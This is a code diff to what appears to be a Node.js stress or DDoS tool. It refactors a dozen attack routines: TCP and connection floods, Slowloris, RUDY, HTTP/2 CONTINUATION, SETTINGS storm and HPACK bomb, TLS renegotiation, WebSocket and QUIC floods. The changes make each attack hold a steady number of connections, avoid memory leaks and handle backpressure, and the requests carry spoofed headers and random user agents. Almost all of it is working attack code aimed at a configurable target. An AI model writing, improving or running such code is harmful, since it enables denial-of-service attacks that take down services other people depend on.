@@ -492,7 +492,7 @@ async function runTCPFlood(
       const req  = `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1,9999999)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: keep-alive\r\n`;
       const junk = Buffer.allocUnsafe(randInt(256, 1500));
       // Fill junk with random bytes
-      for (let i = 0; i < junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
+      for (let i = 0; i + 4 <= junk.length; i += 4) junk.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
       sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
         localBytes += req.length + junk.length + 60;
         clearTimeout(kill);
@@ -572,7 +572,7 @@ async function runHTTPPipeline(
 
   const useHttps = targetPort === 443;
 
-  const runConn = (): Promise<void> => new Promise(resolve => {
+  const oneConn = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     let sock: net.Socket;
@@ -608,17 +608,22 @@ async function runHTTPPipeline(
       sock.once("connect", startPump);
     }
     sock.on("data",    () => {}); // drain responses — keeps TCP window open
-    sock.on("timeout", () => sock.destroy());
-    sock.on("error",   () => resolve());
-    sock.on("close",   () => {
-      if (signal.aborted) resolve();
-      else setTimeout(() => runConn().then(resolve), 10); // reconnect with tiny delay
-    });
+    sock.on("timeout", () => { sock.destroy(); resolve(); });
+    sock.on("error",   () => { resolve(); });
+    sock.on("close",   () => { resolve(); }); // outer while-loop handles reconnect
     signal.addEventListener("abort", () => { sock.destroy(); resolve(); }, { once: true });
   });
 
+  // ★ Async reconnect loop — exactly one connection per slot, no accumulation
+  const runConn = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
+    }
+  };
+
   // Each thread maintains one persistent pipelining connection
-  await Promise.all(Array.from({ length: Math.min(threads, 800) }, () => runConn()));
+  await Promise.all(Array.from({ length: Math.min(threads, 800) }, runConn));
   clearInterval(flushIv);
   clearInterval(poolIv);
   flush();
@@ -773,7 +778,7 @@ async function runSlowlorisReal(
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
 
-  const runSock = (): Promise<void> => new Promise(resolve => {
+  const oneSlowConn = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
@@ -793,9 +798,9 @@ async function runSlowlorisReal(
       if (keepIv) { clearInterval(keepIv); keepIv = null; }
       try { sock.destroy(); } catch { /**/ }
       if (signal.aborted) { settled = true; resolve(); return; }
-      // Immediately respawn to maintain connection count
+      // Just resolve — the outer async runSock loop handles reconnection
       settled = true;
-      setImmediate(() => runSock().then(resolve));
+      resolve();
     };
 
     const onConnected = () => {
@@ -891,7 +896,14 @@ async function runSlowlorisReal(
     }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
+  const runSock = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneSlowConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 5));
+    }
+  };
+
+  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
   clearInterval(flushIv);
   flush();
 }
@@ -923,7 +935,7 @@ async function runConnFlood(
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
 
-  const runSock = (): Promise<void> => new Promise(resolve => {
+  const oneConnFlood = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const sock: net.Socket = useHttps
@@ -942,8 +954,7 @@ async function runConnFlood(
       try { sock.destroy(); } catch { /**/ }
       if (signal.aborted) { settled = true; resolve(); return; }
       settled = true;
-      // Minimal jitter — reconnect fast to maintain connection density
-      setTimeout(() => runSock().then(resolve), randInt(5, 20));
+      resolve(); // outer async runSock while-loop handles reconnect
     };
 
     const onConnected = () => {
@@ -983,7 +994,14 @@ async function runConnFlood(
     }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: MAX_CONN }, () => runSock()));
+  const runSock = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneConnFlood();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 20)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
   clearInterval(flushIv);
   flush();
 }
@@ -1371,7 +1389,7 @@ async function runRUDY(
   const flushIv  = setInterval(flush, 300);
 
   // Each connection uses a raw TCP socket for precise byte-level control
-  const runConn = (): Promise<void> => new Promise(resolve => {
+  const oneRudy = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const sock: net.Socket | tls.TLSSocket = isHttps
@@ -1390,8 +1408,7 @@ async function runRUDY(
       if (keepIv) { clearInterval(keepIv); keepIv = null; }
       try { sock.destroy(); } catch { /**/ }
       if (!signal.aborted && reconnect) {
-        // Reconnect immediately to maintain pressure
-        setImmediate(() => runConn().then(resolve));
+        resolve(); // outer async runConn while-loop reconnects immediately
       } else { resolve(); }
     };
 
@@ -1445,7 +1462,14 @@ async function runRUDY(
     }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: MAX_CONN }, () => runConn()));
+  const runConn = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneRudy();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
+    }
+  };
+
+  await Promise.all(Array.from({ length: MAX_CONN }, runConn));
   clearInterval(flushIv);
   flush();
 }
@@ -1554,8 +1578,8 @@ async function runH2Continuation(
   // Server cannot reject mid-stream — it must buffer until END_HEADERS or connection reset.
   const makeCont = (streamId: number): Buffer => {
     const payload = Buffer.allocUnsafe(randInt(8192, 16384)); // was 128-512 — now max allowed
-    for (let i = 0; i < payload.length; i += 4)
-      payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i); // random data, faster than byte loop
+    for (let i = 0; i + 4 <= payload.length; i += 4)
+      payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
     return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
   };
 
@@ -1566,7 +1590,7 @@ async function runH2Continuation(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
+  const connectAndAttack = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const sock = tls.connect({
@@ -1581,13 +1605,17 @@ async function runH2Continuation(
 
     // Backpressure-aware write: if kernel buffer is full, wait for drain
     // before continuing — prevents unbounded buffer growth (OOM / silent drop)
+    // Resolves on drain OR socket close/error so the Promise never leaks.
     const safeWrite = (buf: Buffer): Promise<void> => {
       if (sock.destroyed) return Promise.resolve();
       const ok = sock.write(buf);
       if (ok) return Promise.resolve();
       return new Promise<void>(r => {
         if (sock.destroyed) { r(); return; }
-        sock.once("drain", r);
+        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
+        sock.once("drain", cleanup);
+        sock.once("error", cleanup);
+        sock.once("close", cleanup);
       });
     };
 
@@ -1629,13 +1657,25 @@ async function runH2Continuation(
     });
 
     sock.on("data",    () => {}); // drain server GOAWAY / SETTINGS frames
-    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    // async attack() loop exits when sock.destroyed or signal.aborted → calls done().
+    // Do NOT reconnect here — the async while-loop in runSlot handles reconnection.
+    sock.on("timeout", () => { sock.destroy(); });
+    sock.on("error",   () => { /* sock auto-destroyed; attack() will exit via sock.destroyed */ });
+    sock.on("close",   () => { done(); }); // ensure inner promise settles on unexpected close
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  // ★ Async reconnect loop: exactly NUM_SLOTS concurrent connections at all times.
+  // When a slot's connection dies, the while-loop immediately creates a new one — no
+  // unbounded recursive promise accumulation, bounded memory = NUM_SLOTS × one socket.
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await connectAndAttack();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
   clearInterval(flushIv);
   flush();
 }
@@ -1666,7 +1706,7 @@ async function runTLSRenego(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
+  const oneSlot = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     // ★ RSA cipher priority: prioritize cipher suites WITHOUT forward secrecy (ECDHE/DHE prefix).
@@ -1718,13 +1758,21 @@ async function runTLSRenego(
     });
 
     sock.on("data",    () => {});
-    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 200); });
-    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 300); });
-    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 150); });
+    sock.on("timeout", () => { sock.destroy(); done(); });
+    sock.on("error",   () => { done(); });
+    sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { try { sock.destroy(); } catch { /**/ } done(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneSlot();
+      // Longer pause than H2 methods — RSA handshake costs should be spaced to avoid self-DoS
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(150, 300)));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
   clearInterval(flushIv);
   flush();
 }
@@ -1812,7 +1860,7 @@ async function runH2SettingsStorm(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
+  const oneSlot = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const sock = tls.connect({
@@ -1845,6 +1893,7 @@ async function runH2SettingsStorm(
       localPkts++; localBytes += 13;
 
       // Storm loop — run as fast as the event loop allows
+      // Frames are small (15B SETTINGS + 13B × OPEN_STREAMS WU) so no backpressure needed
       let toggle = false;
       const storm = () => {
         if (signal.aborted || sock.destroyed) { done(); return; }
@@ -1873,13 +1922,20 @@ async function runH2SettingsStorm(
     });
 
     sock.on("data",    () => {}); // drain server SETTINGS ACKs + RST_STREAMs
-    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    sock.on("timeout", () => { sock.destroy(); done(); });
+    sock.on("error",   () => { done(); });
+    sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneSlot();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
   clearInterval(flushIv);
   flush();
 }
@@ -1918,7 +1974,7 @@ async function runWSFlood(
 
   const wsKey = () => Buffer.from(Array.from({ length: 16 }, () => randInt(0, 256))).toString("base64");
 
-  const runSock = (): Promise<void> => new Promise(resolve => {
+  const oneWs = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
 
     const path   = WS_PATHS[randInt(0, WS_PATHS.length)];
@@ -1984,8 +2040,8 @@ async function runWSFlood(
                     ]);
                 const payload = Buffer.allocUnsafe(frameSize);
                 // Fill with random bytes — prevents server compression shortcuts
-                for (let i = 0; i < frameSize; i += 4)
-                  payload.writeUInt32LE(Math.random() * 0xFFFFFFFF | 0, i);
+                for (let i = 0; i + 4 <= frameSize; i += 4)
+                  payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
                 sock.write(Buffer.concat([frameHdr, payload]));
                 localPkts++; localBytes += frameHdr.length + frameSize;
               } else {
@@ -1995,21 +2051,26 @@ async function runWSFlood(
             catch { done(); }
           }, 8_000);
         } else if (respBuf.length > 8192) {
-          // Not a WS path — reconnect to different path
-          sock.destroy(); done();
-          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 20);
-          return;
+          // Not a WS path — outer while-loop will try a different path automatically
+          sock.destroy(); done(); return;
         }
       }
     });
 
-    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
-    sock.on("error",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve), 100); });
-    sock.on("close",   () => { done();          if (!signal.aborted) setTimeout(() => runSock().then(resolve),  50); });
+    sock.on("timeout", () => { sock.destroy(); done(); });
+    sock.on("error",   () => { done(); });
+    sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: MAX_CONNS }, () => runSock()));
+  const runSock = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneWs();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
+    }
+  };
+
+  await Promise.all(Array.from({ length: MAX_CONNS }, runSock));
   clearInterval(flushIv);
   flush();
 }
@@ -2207,7 +2268,9 @@ async function runQUICFlood(
     pending.push(new Promise<void>(resolve => {
       if (signal.aborted) { resolve(); return; }
       let inflight = 0;
+      let reschedPending = false;
       const send = () => {
+        reschedPending = false;
         if (signal.aborted) { if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); } return; }
         while (inflight < INFLIGHT) {
           inflight++;
@@ -2215,8 +2278,14 @@ async function runQUICFlood(
           s.send(pkt, 0, pkt.length, targetPort, resolvedHost, (err) => {
             inflight--;
             if (!err) { localPkts++; localBytes += pkt.length; }
-            if (!signal.aborted) setImmediate(send);
-            else if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
+            if (signal.aborted) {
+              if (inflight === 0) { try { s.close(); } catch {/**/} resolve(); }
+            } else if (!reschedPending) {
+              // Schedule ONE reschedule per event-loop tick to avoid timer starvation.
+              // setImmediate lets the 300ms stats timer fire between batches.
+              reschedPending = true;
+              setImmediate(send);
+            }
           });
         }
       };
@@ -2542,7 +2611,7 @@ async function runHPACKBomb(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const runSlot = (): Promise<void> => new Promise(resolve => {
+  const oneHpack = (): Promise<void> => new Promise(resolve => {
     if (signal.aborted) { resolve(); return; }
     const sock = tls.connect({
       host:                resolvedHost,
@@ -2556,32 +2625,60 @@ async function runHPACKBomb(
     let settled = false;
     const done  = () => { if (!settled) { settled = true; resolve(); } };
 
+    // Backpressure-aware write: HPACK bomb frames are large (up to 1.2MB each);
+    // writing without checking backpressure causes OOM via unbounded buffer growth.
+    // IMPORTANT: also resolves on socket close/error so the promise never leaks.
+    const safeWrite = (buf: Buffer): Promise<void> => {
+      if (sock.destroyed) return Promise.resolve();
+      const ok = sock.write(buf);
+      if (ok) return Promise.resolve();
+      return new Promise<void>(r => {
+        if (sock.destroyed) { r(); return; }
+        const cleanup = () => { sock.off("drain", cleanup); sock.off("error", cleanup); sock.off("close", cleanup); r(); };
+        sock.once("drain", cleanup);
+        sock.once("error", cleanup);
+        sock.once("close", cleanup);
+      });
+    };
+
     sock.once("secureConnect", () => {
       sock.write(Buffer.concat([PREFACE, SETTINGS, SACK]));
       localPkts++; localBytes += PREFACE.length + 18;
 
       let streamId = 1;
-      const attack = () => {
-        if (signal.aborted || sock.destroyed) { done(); return; }
-        // H2 client stream IDs must strictly increase; close + reopen near ceiling
-        if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
-        const frame = makeHPACKBombFrame(streamId);
-        sock.write(frame);
-        localPkts++; localBytes += frame.length;
-        streamId += 2; // client-initiated streams use odd IDs
-        setImmediate(attack);
+
+      // Async attack loop: write one HPACK bomb frame per iteration with backpressure.
+      // Each frame contains 50-150 huge literal headers → forces server to expand HPACK
+      // dynamic table and allocate memory for each header value (BOMB_VAL_SIZE bytes each).
+      const attack = async (): Promise<void> => {
+        while (!signal.aborted && !sock.destroyed) {
+          if (streamId > 0x7fffff00) { sock.destroy(); done(); return; }
+          const frame = makeHPACKBombFrame(streamId);
+          await safeWrite(frame); // wait for drain if kernel buffer full
+          localPkts++; localBytes += frame.length;
+          streamId += 2; // client-initiated streams use odd IDs
+          await new Promise<void>(r => setImmediate(r)); // yield to event loop
+        }
+        done();
       };
-      attack();
+      attack().catch(() => done());
     });
 
     sock.on("data",    () => {});  // drain server responses (SETTINGS ACK, RST, etc.)
-    sock.on("timeout", () => { sock.destroy(); done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("error",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve), 100); });
-    sock.on("close",   () => { done(); if (!signal.aborted) setTimeout(() => runSlot().then(resolve),  50); });
+    sock.on("timeout", () => { sock.destroy(); done(); });
+    sock.on("error",   () => { done(); });
+    sock.on("close",   () => { done(); });
     signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
   });
 
-  await Promise.all(Array.from({ length: NUM_SLOTS }, () => runSlot()));
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneHpack();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50));
+    }
+  };
+
+  await Promise.all(Array.from({ length: NUM_SLOTS }, runSlot));
   clearInterval(flushIv);
   flush();
 }
@@ -2602,7 +2699,10 @@ let targetPort = cfg.port || 80;
 try {
   const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
   hostname   = u.hostname;
-  targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
+  // Fallback chain: explicit URL port → cfg.port → protocol default.
+  // Previously was just `parseInt(u.port)||protocol`, which overwrote cfg.port=443
+  // with 80 when URL was built as http://domain (no explicit port in URL).
+  targetPort = parseInt(u.port, 10) || cfg.port || (u.protocol === "https:" ? 443 : 80);
 } catch { /* keep raw */ }
 
 const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
@@ -2717,7 +2817,7 @@ async function runWorker() {
 }
 
 runWorker()
-  .catch(() => { /* swallow all errors — worker exits cleanly */ })
+  .catch((e) => { process.stderr.write(`[WORKER_ERR] ${cfg.method}: ${e?.message ?? e}\n`); })
   .finally(() => {
     parentPort?.postMessage({ done: true });
   });
